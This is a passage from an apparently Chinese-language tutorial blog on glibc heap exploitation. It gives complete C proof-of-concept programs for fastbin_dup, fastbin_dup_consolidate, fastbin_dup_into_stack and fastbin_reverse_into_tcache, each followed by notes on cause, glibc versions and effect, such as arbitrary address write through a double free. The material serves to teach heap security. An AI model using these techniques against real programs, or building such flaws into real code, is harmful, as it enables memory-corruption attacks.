a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先申请8个chunk，7个用于填充tcachebin,1个用于隔离</p>
<p>然后free掉7个chunk填充tcachebin</p>
<p>继续再申请3个chunk–chunk1,2,3</p>
<p>按顺序free chunk1 chunk2 chunk1</p>
<p>最终再连续申请3次即可得到两个控制chunk1的指针</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>引入tcache机制后fastbin的机制没变，依旧是只检查相邻节点的后一个</p>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a，实现修改fastbin链表到任意可写的地方</li>
</ul>
<h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>引入tcache之前无需填充tcache，引入tcache之后要填充tcache</p>
<h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><p>通过 double free 实现任意地址写</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>效果：实现 double free</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">原始参考文献：https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">本文档主要用于演示 malloc_consolidate 的工作原理，以及如何利用双重释放（double free）来获得两个指向同一大块内存的指针，这通常很难直接做到，因为存在前用检查（previnuse check）。有趣的是，这还包括某些大小的 tcache（线程缓存）大小块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714）本质上是合并所有快速分配块（fastbin chunks）及其相邻的块，将它们放入未排序的块中，并在可能的情况下与顶部块合并。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">截至 glibc 版本 2.35，该函数仅在以下五个地方被调用：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">_int_malloc：当正在分配一个大块时（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965）</span></span><br><span class="line"><span class="comment">_int_malloc：如果没有找到块并且顶部块太小（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394）</span></span><br><span class="line"><span class="comment">_int_free：如果块大小 &gt;= FASTBIN_CONSOLIDATION_THRESHOLD（65536）（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674）</span></span><br><span class="line"><span class="comment">mtrim：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041）</span></span><br><span class="line"><span class="comment">__libc_mallopt：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463）</span></span><br><span class="line"><span class="comment">我们将针对第一个地方，因此我们需要分配一个不属于小块（small bin）的块（因为我们试图进入此检查的 &quot;else&quot; 分支： https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901）。这意味着我们的块大小需要 &gt;= 0x400（因此是大块）。值得注意的是，最大的 tcache 大小块是 0x410，所以如果我们的块大小在 [0x400, 0x410] 范围内，我们可以利用双重释放来控制一个 tcache 大小块。.   </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Lets prepare to fill up the tcache in order to force fastbin usage...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;Now freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a tcache-sized chunk with chunk size 0x410 &quot;</span>);</span><br><span class="line">  	<span class="type">void</span>* p2 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p2=%p.\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(p1 == p2);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1); <span class="comment">// vulnerability (double free)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It is now in the tcache (or merged with top if we had initially chosen a chunk size &gt; 0x410).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p2 hasn&#x27;t been freed although it now points to a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will request 0x400 bytes. This will give us the 0x410 chunk that&#x27;s currently in\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the tcache bin. p2 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *p3 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	assert(p3 == p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p2 and p3) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;and both point to the same tcache sized chunk. p2=%p p3=%p\n&quot;</span>, p2, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Note: This duplication would have also worked with a larger chunk size, the chunks would\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;have behaved the same, just being taken from the top instead of from the tcache bin.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is pretty cool because it is usually difficult to duplicate large sized chunks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;because they are resistant to direct double free&#x27;s due to their PREV_INUSE check.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以通过double free(一个在bins中，一个在其他的大的chunk中)来实现任意地址写</p>
<ul>
<li>申请7个chunk，再申请1个 chunk 名 p1</li>
<li>释放掉前7个chunk来填满tcache，再释放p1，此时它会进入fastbin中</li>
<li>申请一个largebin_chunk，申请大小为0x400那样得到的chunk为0x410(在tcache管理范围内)，malloc()此时会调用consilidate()函数合并所有的fastbin，p1就会被用在新申请的largebin_chunk的头部得到p2</li>
<li>再次free(p1)tcache中就会多一个chunk(0x410)，在将它申请出来得到p3</li>
<li>最终p2&#x3D;p3也就再次实现了两个可控的指针指向同一个chunk</li>
</ul>
<h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>效果：通过 double free 来实现分配地址到栈上</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">	assert(p == <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出，UAF等</p>
<h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>这个是fastbin_dup的扩展，基本一样：</p>
<ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a 的fd指针为target - 0x10，并伪造target处的size</li>
<li>最后target就会出现在fastbin链表中，申请出即可</li>
</ul>
<h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;下一个分配会触发栈被覆盖。tcache 为空，但 fastbin 不是，因此下一个分配来自 fastbin。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;同时，fastbin 中使用了 7 个块来补充 tcache。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;这 7 个块以逆序复制到 tcache 中，因此我们目标的栈地址\n&quot;</span></span><br><span class="line">    <span class="string">&quot;最终成为 tcache 中的第一个块。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;它包含指向列表中下一个块的指针，这就是为什么一个堆指针会被写入栈中的原因。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;之前我们提到，如果我们释放少于 6 个额外的 fastbin 指针，攻击仍然会奏效，但前提是\n&quot;</span></span><br><span class="line">    <span class="string">&quot;栈上的值为零。这是因为栈上的值被视为链表中的下一个指针，\n&quot;</span></span><br><span class="line">    <span class="string">&quot;如果它不是有效指针或空指针，则会触发崩溃。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;我们在栈上的数组内容现在如下所示：\n\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请了14个chunk，free掉7个填满tcache</li>
<li>free(victim)，victim是我们要修改的chunk</li>
<li>再free掉6个chunk填满fastbin，</li>
<li>修改victim的fd指针，指向target</li>
<li>清空tcache,此时申请chunk会从fastbin中取出，同时将fastbin中剩余的chunk<strong>逆序放入</strong>tcache中，我们第一个free的chunk(即victim)的fd(即栈地址)成为了tcache中的首个chunk，<strong>实现向target的fd,bk写入堆地址</strong></li>
<li>最后申请一次就可以直接申请出这个target伪造的chunk</li>
</ul>
<p>**注意：**若栈地址上的内容都为零，在fastbin中放入vicitm即可（无需再放6个）</p>
